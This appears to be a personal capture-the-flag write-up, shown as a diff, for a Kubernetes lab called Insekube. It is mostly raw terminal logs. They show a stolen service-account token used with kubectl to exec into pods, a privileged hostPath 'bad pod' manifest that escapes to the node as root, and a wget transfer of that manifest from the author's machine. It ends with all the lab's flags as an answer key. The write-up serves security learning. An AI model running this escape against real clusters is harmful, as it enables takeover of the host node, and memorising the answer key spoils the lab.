@@ -931,3 +931,470 @@ selfsubjectrulesreviews.authorization.k8s.io    []                              
                                                 [/readyz]                             []               [get]
                                                 [/readyz]                             []               [get]
                                                 [/version/]                           []               [get]
+                                                [/version/]                           []               [get]
+                                                [/version]                            []               [get]
+                                                [/version]                            []               [get]
+
+challenge@syringe-79b66d66d7-6xdjz:/tmp$ ./kubectl get pods --token=$TOKEN
+./kubectl get pods --token=$TOKEN
+NAME                       READY   STATUS    RESTARTS      AGE
+grafana-57454c95cb-f9js5   1/1     Running   2 (24h ago)   24h
+syringe-79b66d66d7-6xdjz   1/1     Running   2 (24h ago)   24h
+
+challenge@syringe-79b66d66d7-6xdjz:/tmp$ ./kubectl exec -it grafana-57454c95cb-f9js5 --token=$TOKEN -- /bin/bash
+<rafana-57454c95cb-f9js5 --token=$TOKEN -- /bin/bash
+Unable to use a TTY - input is not a terminal or the right kind of file
+hostname
+grafana-57454c95cb-f9js5
+
+https://jwt.io/
+
+copy token
+
+{
+
+  "alg": "RS256",
+
+  "kid": "JpqHHgXrD_Elf2CZbXsbzfa4jgI9tgvu_gLxP-MDTiU"
+
+}
+
+{
+  "aud": [
+    "https://kubernetes.default.svc.cluster.local"
+  ],
+  "exp": 1709424908,
+  "iat": 1677888908,
+  "iss": "https://kubernetes.default.svc.cluster.local",
+  "kubernetes.io": {
+    "namespace": "default",
+    "pod": {
+      "name": "grafana-57454c95cb-f9js5",
+      "uid": "87db48b0-d176-428c-9fa5-2d5d39f25867"
+    },
+    "serviceaccount": {
+      "name": "developer",
+      "uid": "b01b0879-ce02-4014-b612-129eec0167b4"
+    },
+    "warnafter": 1677892515
+  },
+  "nbf": 1677888908,
+  "sub": "system:serviceaccount:default:developer"
+}
+
+RSASHA256(
+  base64UrlEncode(header) + "." +
+  base64UrlEncode(payload),
+  ,
+  
+)
+
+id
+uid=472(grafana) gid=0(root) groups=0(root)
+env
+KUBERNETES_SERVICE_PORT_HTTPS=443
+GRAFANA_SERVICE_HOST=10.105.120.1
+KUBERNETES_SERVICE_PORT=443
+HOSTNAME=grafana-57454c95cb-f9js5
+SYRINGE_PORT=tcp://10.103.9.166:3000
+GRAFANA_PORT=tcp://10.105.120.1:3000
+SYRINGE_SERVICE_HOST=10.103.9.166
+SYRINGE_PORT_3000_TCP=tcp://10.103.9.166:3000
+GRAFANA_PORT_3000_TCP=tcp://10.105.120.1:3000
+PWD=/
+GF_PATHS_HOME=/usr/share/grafana
+SYRINGE_PORT_3000_TCP_PROTO=tcp
+HOME=/home/grafana
+KUBERNETES_PORT_443_TCP=tcp://10.96.0.1:443
+FLAG=flag{288232b2f03b1ec422c5dae50f14061f}
+SHLVL=1
+SYRINGE_PORT_3000_TCP_PORT=3000
+GF_PATHS_PROVISIONING=/etc/grafana/provisioning
+GRAFANA_PORT_3000_TCP_PORT=3000
+KUBERNETES_PORT_443_TCP_PROTO=tcp
+KUBERNETES_PORT_443_TCP_ADDR=10.96.0.1
+GRAFANA_SERVICE_PORT=3000
+SYRINGE_PORT_3000_TCP_ADDR=10.103.9.166
+SYRINGE_SERVICE_PORT=3000
+GF_PATHS_DATA=/var/lib/grafana
+KUBERNETES_SERVICE_HOST=10.96.0.1
+KUBERNETES_PORT=tcp://10.96.0.1:443
+KUBERNETES_PORT_443_TCP_PORT=443
+GF_PATHS_LOGS=/var/log/grafana
+GRAFANA_PORT_3000_TCP_PROTO=tcp
+PATH=/usr/share/grafana/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+GF_PATHS_PLUGINS=/var/lib/grafana/plugins
+GRAFANA_PORT_3000_TCP_ADDR=10.105.120.1
+GF_PATHS_CONFIG=/etc/grafana/grafana.ini
+_=/usr/bin/env
+OLDPWD=/usr/share/grafana/.aws
+
+cd root
+/bin/bash: line 13: cd: root: Permission denied
+```
+What is the name of the service account running the Grafana service?
+*developer*
+How many pods are running?
+*2*
+What is flag 3?
+### Escape to the node
+You can now close the Grafana pod shell and continue using the first one since it is more stable.
+Having admin access to the cluster you can create any resources you want. [This article](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation) explains how to get access to the Kubernetes nodes by running a pod that mounts the node's file system.
+You can create a "bad" pod based on their [first case example](https://github.com/BishopFox/badPods/blob/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml). You will need a slight modification because the VM does not have an internet connection, therefore it is not able to pull the `ubuntu` container image. The image is available in minikube's local docker registry therefore you just need to tell Kubernetes to use the local version instead of pulling it. You can achieve this by adding `imagePullPolicy: IfNotPresent` to your "bad" pod container. Once that is done you can run `kubectl apply` to create the pod. Then `kubectl exec` into the new pod, you will find the node's file system mounted on `/host`.
+Insekube
+```shell-session
+challenge@syringe:/tmp$ ./kubectl apply -f privesc.yml --token=${TOKEN}
+pod/everything-allowed-exec-pod created
+
+challenge@syringe:/tmp$ ./kubectl get pods --token=${TOKEN}
+NAME                          READY   STATUS    RESTARTS       AGE
+everything-allowed-exec-pod   1/1     Running   0              61s
+grafana-57454c95cb-v4nrk      1/1     Running   10 (18d ago)   41d
+syringe-79b66d66d7-7mxhd      1/1     Running   1 (18d ago)    18d
+```
+Insekube
+```shell-session
+challenge@syringe:/tmp$ ./kubectl exec -it everything-allowed-exec-pod --token=${TOKEN} -- /bin/bash
+Unable to use a TTY - input is not a terminal or the right kind of file
+hostname
+minikube
+```
+Get the root flag!
+Answer the questions below
+
+## Privilege Escalation
+```text
+Create a “Bad Pod” to escape to the host
+
+cd /tmp
+ls
+ls -lah
+total 8K     
+drwxrwxrwt    1 root     root        4.0K Nov 25  2021 .
+drwxr-xr-x    1 root     root        4.0K Mar  3 23:26 ..
+exit
+challenge@syringe-79b66d66d7-6xdjz:/tmp$ ls -lah
+ls -lah
+total 46M
+drwxrwxrwt 1 root      root      4.0K Mar  3 23:54 .
+drwxr-xr-x 1 root      root      4.0K Mar  3 23:26 ..
+-rwxr-xr-x 1 challenge challenge  46M Mar  3 23:42 kubectl
+
+challenge@syringe-79b66d66d7-6xdjz:/tmp$ 
+
+cat <<EOF | ./kubectl create --token=$TOKEN -f -
+apiVersion: v1
+kind: Pod
+metadata:
+  name: everything-allowed-exec-pod
+  labels:
+    app: pentest
+spec:
+  hostNetwork: true
+  hostPID: true
+  hostIPC: true
+  containers:
+  - name: everything-allowed-pod
+    image: ubuntu
+    imagePullPolicy: IfNotPresent
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - mountPath: /host
+      name: noderoot
+    command: [ "/bin/sh", "-c", "--" ]
+    args: [ "while true; do sleep 30; done;" ]
+  volumes:
+  - name: noderoot
+    hostPath:
+      path: /
+EOF
+
+challenge@syringe-79b66d66d7-6xdjz:/tmp$ ./kubectl get pods --token=$TOKEN
+./kubectl get pods --token=$TOKEN
+NAME                            READY   STATUS             RESTARTS      AGE
+everything-allowed-exec-pod     0/1     ImagePullBackOff   0             10m
+everything-allowed-exec-pod-2   0/1     ErrImagePull       0             68s
+grafana-57454c95cb-f9js5        1/1     Running            2 (24h ago)   25h
+syringe-79b66d66d7-6xdjz        1/1     Running            2 (24h ago)   25h
+
+I see the problem let's do it again
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ cat privesc.yml 
+apiVersion: v1
+kind: Pod
+metadata:
+  name: everything-allowed-exec-pod
+  labels:
+    app: pentest
+spec:
+  hostNetwork: true
+  hostPID: true
+  hostIPC: true
+  containers:
+  - name: everything-allowed-pod
+    image: ubuntu
+    imagePullPolicy: IfNotPresent
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - mountPath: /host
+      name: noderoot
+    command: [ "/bin/sh", "-c", "--" ]
+    args: [ "while true; do sleep 30; done;" ]
+  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
+  volumes:
+  - name: noderoot
+    hostPath:
+      path: /
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ python3 -m http.server 1234
+Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
+10.10.32.40 - - [03/Mar/2023 20:43:57] "GET /privesc.yml HTTP/1.1" 200 -
+
+challenge@syringe-79b66d66d7-6xdjz:/tmp$ wget http://10.8.19.103:1234/privesc.yml
+<xdjz:/tmp$ wget http://10.8.19.103:1234/privesc.yml
+--2023-03-04 01:43:57--  http://10.8.19.103:1234/privesc.yml
+Connecting to 10.8.19.103:1234... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 505 [application/octet-stream]
+Saving to: 'privesc.yml'
+
+     0K                                                       100% 58.7M=0s
+
+2023-03-04 01:43:58 (58.7 MB/s) - 'privesc.yml' saved [505/505]
+
+let's do it
+
+challenge@syringe-79b66d66d7-6xdjz:/tmp$ ./kubectl delete pod everything-allowed-exec-pod --token=$TOKEN
+
+<lete pod everything-allowed-exec-pod --token=$TOKEN
+pod "everything-allowed-exec-pod" deleted
+challenge@syringe-79b66d66d7-6xdjz:/tmp$ 
+challenge@syringe-79b66d66d7-6xdjz:/tmp$ ./kubectl get pods --token=$TOKEN
+./kubectl get pods --token=$TOKEN
+NAME                       READY   STATUS    RESTARTS      AGE
+grafana-57454c95cb-f9js5   1/1     Running   2 (25h ago)   26h
+syringe-79b66d66d7-6xdjz   1/1     Running   2 (25h ago)   26h
+
+challenge@syringe-79b66d66d7-6xdjz:/tmp$ ./kubectl auth can-i create pods --token=$TOKEN
+<mp$ ./kubectl auth can-i create pods --token=$TOKEN
+yes
+
+hallenge@syringe-79b66d66d7-6xdjz:/tmp$ ./kubectl apply -f privesc.yml --token=$TOKEN
+<tmp$ ./kubectl apply -f privesc.yml --token=$TOKEN
+pod/everything-allowed-exec-pod created
+
+challenge@syringe-79b66d66d7-6xdjz:/tmp$ ./kubectl get pods --token=$TOKEN
+./kubectl get pods --token=$TOKEN
+NAME                          READY   STATUS         RESTARTS      AGE
+everything-allowed-exec-pod   0/1     ErrImagePull   0             22s
+grafana-57454c95cb-f9js5      1/1     Running        2 (26h ago)   27h
+syringe-79b66d66d7-6xdjz      1/1     Running        2 (26h ago)   27h
+
+uhmm
+
+cat << 'EOF' | 
+apiVersion: v1
+kind: Pod
+metadata:
+  name: everything-allowed-exec-pod
+  labels:
+    app: pentest
+spec:
+  hostNetwork: true
+  hostPID: true
+  hostIPC: true
+  containers:
+  - name: everything-allowed-pod    
+    image: ubuntu
+    imagePullPolicy: IfNotPresent
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - mountPath: /host
+      name: noderoot
+    command: [ "/bin/sh", "-c", "--" ]
+    args: [ "while true; do sleep 30; done;" ]  
+  volumes:
+  - name: noderoot
+    hostPath:
+      path: /
+EOF
+(export NAMESPACE=default && ./kubectl apply -n $NAMESPACE -f - --token=$TOKEN)
+
+challenge@syringe-79b66d66d7-6xdjz:/tmp$ ./kubectl logs everything-allowed-exec-pod --token=$TOKEN
+<ctl logs everything-allowed-exec-pod --token=$TOKEN
+Error from server (BadRequest): container "everything-allowed-pod" in pod "everything-allowed-exec-pod" is waiting to start: trying and failing to pull image
+
+challenge@syringe-79b66d66d7-6xdjz:/tmp$ ./kubectl describe pod everything-allowed-exec-pod --token=$TOKEN
+
+<ribe pod everything-allowed-exec-pod --token=$TOKEN
+Name:             everything-allowed-exec-pod
+Namespace:        default
+Priority:         0
+Service Account:  default
+Node:             minikube/192.168.49.2
+Start Time:       Sat, 04 Mar 2023 03:49:37 +0000
+Labels:           app=pentest
+Annotations:      <none>
+Status:           Pending
+IP:               192.168.49.2
+IPs:
+  IP:  192.168.49.2
+Containers:
+  everything-allowed-pod:
+    Container ID:  
+    Image:         ubuntu
+    Image ID:      
+    Port:          <none>
+    Host Port:     <none>
+    Command:
+      /bin/sh
+      -c
+      --
+    Args:
+      while true; do sleep 30; done;
+    State:          Waiting
+      Reason:       ErrImagePull
+    Ready:          False
+    Restart Count:  0
+    Environment:    <none>
+    Mounts:
+      /host from noderoot (rw)
+      /var/run/secrets/kubernetes.io/serviceaccount from kube-api-access-llgxf (ro)
+Conditions:
+  Type              Status
+  Initialized       True 
+  Ready             False 
+  ContainersReady   False 
+  PodScheduled      True 
+Volumes:
+  noderoot:
+    Type:          HostPath (bare host directory volume)
+    Path:          /
+    HostPathType:  
+  kube-api-access-llgxf:
+    Type:                    Projected (a volume that contains injected data from multiple sources)
+    TokenExpirationSeconds:  3607
+    ConfigMapName:           kube-root-ca.crt
+    ConfigMapOptional:       <nil>
+    DownwardAPI:             true
+QoS Class:                   BestEffort
+Node-Selectors:              <none>
+Tolerations:                 node.kubernetes.io/not-ready:NoExecute op=Exists for 300s
+                             node.kubernetes.io/unreachable:NoExecute op=Exists for 300s
+Events:
+  Type     Reason     Age                From               Message
+  ----     ------     ----               ----               -------
+  Normal   Scheduled  70s                default-scheduler  Successfully assigned default/everything-allowed-exec-pod to minikube
+  Warning  Failed     54s                kubelet            Failed to pull image "ubuntu": rpc error: code = Unknown desc = Error response from daemon: Get "https://registry-1.docker.io/v2/": net/http: request canceled while waiting for connection (Client.Timeout exceeded while awaiting headers)
+  Normal   Pulling    39s (x2 over 69s)  kubelet            Pulling image "ubuntu"
+  Warning  Failed     24s (x2 over 54s)  kubelet            Error: ErrImagePull
+  Warning  Failed     24s                kubelet            Failed to pull image "ubuntu": rpc error: code = Unknown desc = Error response from daemon: Get "https://registry-1.docker.io/v2/": context deadline exceeded
+  Normal   BackOff    13s (x2 over 54s)  kubelet            Back-off pulling image "ubuntu"
+  Warning  Failed     13s (x2 over 54s)  kubelet            Error: ImagePullBackOff
+
+maybe is an internal problem idk
+
+The option "-w 0" passed to the base64 command specifies that no line wrapping should be performed during encoding. By default, base64 wraps encoded output at 76 characters per line, which can cause issues when copying or transmitting the data. Setting "-w 0" disables line wrapping, resulting in a single long line of encoded output.
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ cat privesc.yml | base64 -w 0       
+YXBpVmVyc2lvbjogdjEKa2luZDogUG9kCm1ldGFkYXRhOgogIG5hbWU6IGV2ZXJ5dGhpbmctYWxsb3dlZC1leGVjLXBvZAogIGxhYmVsczoKICAgIGFwcDogcGVudGVzdApzcGVjOgogIGhvc3ROZXR3b3JrOiB0cnVlCiAgaG9zdFBJRDogdHJ1ZQogIGhvc3RJUEM6IHRydWUKICBjb250YWluZXJzOgogIC0gbmFtZTogZXZlcnl0aGluZy1hbGxvd2VkLXBvZAogICAgaW1hZ2U6IHVidW50dQogICAgaW1hZ2VQdWxsUG9saWN5OiBJZk5vdFByZXNlbnQKICAgIHNlY3VyaXR5Q29udGV4dDoKICAgICAgcHJpdmlsZWdlZDogdHJ1ZQogICAgdm9sdW1lTW91bnRzOgogICAgLSBtb3VudFBhdGg6IC9ob3N0CiAgICAgIG5hbWU6IG5vZGVyb290CiAgICBjb21tYW5kOiBbICIvYmluL3NoIiwgIi1jIiwgIi0tIiBdCiAgICBhcmdzOiBbICJ3aGlsZSB0cnVlOyBkbyBzbGVlcCAzMDsgZG9uZTsiIF0KICAjbm9kZU5hbWU6IGs4cy1jb250cm9sLXBsYW5lLW5vZGUgIyBGb3JjZSB5b3VyIHBvZCB0byBydW4gb24gdGhlIGNvbnRyb2wtcGxhbmUgbm9kZSBieSB1bmNvbW1lbnRpbmcgdGhpcyBsaW5lIGFuZCBjaGFuZ2luZyB0byBhIGNvbnRyb2wtcGxhbmUgbm9kZSBuYW1lCiAgdm9sdW1lczoKICAtIG5hbWU6IG5vZGVyb290CiAgICBob3N0UGF0aDoKICAgICAgcGF0aDogLwo=
+
+challenge@syringe-79b66d66d7-6xdjz:/tmp$ echo "YXBpVmVyc2lvbjogdjEKa2luZDogUG9kCm1ldGFkYXRhOgogIG5hbWU6IGV2ZXJ5dGhpbmctYWxsb3dlZC1leGVjLXBvZAogIGxhYmVsczoKICAgIGFwcDogcGVudGVzdApzcGVjOgogIGhvc3ROZXR3b3JrOiB0cnVlCiAgaG9zdFBJRDogdHJ1ZQogIGhvc3RJUEM6IHRydWUKICBjb250YWluZXJzOgogIC0gbmFtZTogZXZlcnl0aGluZy1hbGxvd2VkLXBvZAogICAgaW1hZ2U6IHVidW50dQogICAgaW1hZ2VQdWxsUG9saWN5OiBJZk5vdFByZXNlbnQKICAgIHNlY3VyaXR5Q29udGV4dDoKICAgICAgcHJpdmlsZWdlZDogdHJ1ZQogICAgdm9sdW1lTW91bnRzOgogICAgLSBtb3VudFBhdGg6IC9ob3N0CiAgICAgIG5hbWU6IG5vZGVyb290CiAgICBjb21tYW5kOiBbICIvYmluL3NoIiwgIi1jIiwgIi0tIiBdCiAgICBhcmdzOiBbICJ3aGlsZSB0cnVlOyBkbyBzbGVlcCAzMDsgZG9uZTsiIF0KICAjbm9kZU5hbWU6IGs4cy1jb250cm9sLXBsYW5lLW5vZGUgIyBGb3JjZSB5b3VyIHBvZCB0byBydW4gb24gdGhlIGNvbnRyb2wtcGxhbmUgbm9kZSBieSB1bmNvbW1lbnRpbmcgdGhpcyBsaW5lIGFuZCBjaGFuZ2luZyB0byBhIGNvbnRyb2wtcGxhbmUgbm9kZSBuYW1lCiAgdm9sdW1lczoKICAtIG5hbWU6IG5vZGVyb290CiAgICBob3N0UGF0aDoKICAgICAgcGF0aDogLwo=" | base64 -d > privesc.yml
+
+challenge@syringe-79b66d66d7-6xdjz:/tmp$ cat privesc.yml
+cat privesc.yml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: everything-allowed-exec-pod
+  labels:
+    app: pentest
+spec:
+  hostNetwork: true
+  hostPID: true
+  hostIPC: true
+  containers:
+  - name: everything-allowed-pod
+    image: ubuntu
+    imagePullPolicy: IfNotPresent
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - mountPath: /host
+      name: noderoot
+    command: [ "/bin/sh", "-c", "--" ]
+    args: [ "while true; do sleep 30; done;" ]
+  #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
+  volumes:
+  - name: noderoot
+    hostPath:
+      path: /
+
+challenge@syringe-79b66d66d7-6xdjz:/tmp$ ./kubectl apply -f privesc.yml --token=${TOKEN}
+<mp$ ./kubectl apply -f privesc.yml --token=${TOKEN}
+pod/everything-allowed-exec-pod created
+challenge@syringe-79b66d66d7-6xdjz:/tmp$ ./kubectl get pods --token=${TOKEN}
+./kubectl get pods --token=${TOKEN}
+NAME                          READY   STATUS              RESTARTS      AGE
+everything-allowed-exec-pod   0/1     ContainerCreating   0             10s
+grafana-57454c95cb-f9js5      1/1     Running             2 (41h ago)   41h
+syringe-79b66d66d7-6xdjz      1/1     Running             2 (41h ago)   41h
+challenge@syringe-79b66d66d7-6xdjz:/tmp$ ./kubectl get pods --token=${TOKEN}
+./kubectl get pods --token=${TOKEN}
+NAME                          READY   STATUS         RESTARTS      AGE
+everything-allowed-exec-pod   0/1     ErrImagePull   0             21s
+grafana-57454c95cb-f9js5      1/1     Running        2 (41h ago)   41h
+syringe-79b66d66d7-6xdjz      1/1     Running        2 (41h ago)   41h
+
+challenge@syringe-79b66d66d7-6xdjz:/tmp$ ./kubectl get services --token=$TOKEN
+<7-6xdjz:/tmp$ ./kubectl get services --token=$TOKEN
+NAME         TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)          AGE
+grafana      NodePort    10.105.120.1   <none>        3000:32620/TCP   2d18h
+kubernetes   ClusterIP   10.96.0.1      <none>        443/TCP          2d18h
+syringe      NodePort    10.103.9.166   <none>        3000:30000/TCP   2d18h
+
+challenge@syringe-79b66d66d7-6xdjz:/tmp$ ./kubectl get serviceaccount --token=$TOKEN
+<z:/tmp$ ./kubectl get serviceaccount --token=$TOKEN
+NAME        SECRETS   AGE
+default     1         2d18h
+developer   1         2d18h
+syringe     1         2d18h
+
+challenge@syringe-79b66d66d7-6xdjz:/tmp$ ./kubectl exec -it everything-allowed-exec-pod --token=$TOKEN -- /bin/bash
+Unable to use a TTY - input is not a terminal or the right kind of file
+
+id
+
+uid=0(root) gid=0(root) groups=0(root)
+
+/bin/bash: line 6: cd: host: No such file or directory
+
+cd /host
+
+cd root
+
+ls
+
+root.txt
+
+cat root.txt
+
+flag{30180a273e7da821a7fe4af22ffd1701}
+```
+What is root.txt?
+
+## Flags / Answers
+- ***flag{5e7cc6165f6c2058b11710a26691bb6b}***
+- ***flag{df2a636de15108a4dc41135d930d8ec1}***
+- ***flag{288232b2f03b1ec422c5dae50f14061f}***
+- ***flag{30180a273e7da821a7fe4af22ffd1701}***
+
+## Notes / Lessons Learned
+[[TakeOver]]
+
